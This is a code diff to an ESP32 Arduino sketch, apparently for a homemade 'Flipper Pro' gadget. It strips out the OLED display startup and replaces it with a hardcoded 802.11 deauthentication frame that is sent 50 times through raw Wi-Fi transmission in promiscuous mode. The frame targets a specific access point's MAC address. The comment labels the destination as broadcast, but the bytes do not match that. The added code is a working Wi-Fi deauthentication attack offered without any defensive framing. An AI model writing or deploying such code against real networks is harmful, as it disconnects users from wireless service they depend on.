@@ -1,36 +1,38 @@
 #include <Arduino.h>
-#include <Wire.h>
-#include <Adafruit_GFX.h>
-#include <Adafruit_SSD1306.h>
+#include "esp_wifi.h"
+#include "WiFi.h"
 
-#define SCREEN_WIDTH 128
-#define SCREEN_HEIGHT 64
-#define OLED_RESET    -1  // Reset pin not used
+uint8_t deauth_packet[26] = {
+  0xC0, 0x00, 0x00, 0x00,
+  0x98, 0x87, 0x4c, 0x3c, 0x9f, 0x7f,  // Destination (broadcast)
+  0x90, 0x8d, 0x78, 0x3c, 0x9f, 0x7f,  // Source (AP)
+  0x90, 0x8d, 0x78, 0x3c, 0x9f, 0x7f,  // BSSID (AP)
+  0x00, 0x00,
+  0x07, 0x00
+};
 
-Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);
- 
 void setup() {
   Serial.begin(115200);
-  
-  if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
-    Serial.println(F("OLED not found"));
-    for (;;); // Freeze
+  delay(1000);
+
+  // Ensure WiFi initialized
+  WiFi.mode(WIFI_MODE_APSTA);
+  esp_wifi_start();
+  delay(100);
+
+  // Enable promiscuous (low-level access)
+  esp_wifi_set_promiscuous(true);
+
+  Serial.println("Sending deauth packet...");
+
+  for (int i = 0; i < 50; i++) {
+    esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
+    delay(10);
   }
 
-  display.clearDisplay();
-  display.setTextSize(1);
-  display.setTextColor(WHITE);
-  display.setCursor(0, 0);
-  display.println("🚀 Flipper Pro Booting...");
-  display.display();
-  delay(2000);
-
-  display.clearDisplay();
-  display.setCursor(0, 0);
-  display.println("✅ OLED Ready");
-  display.display();
+  Serial.println("Done.");
 }
 
 void loop() {
-  // Add navigation/menu logic here
+  // Nothing to do
 }
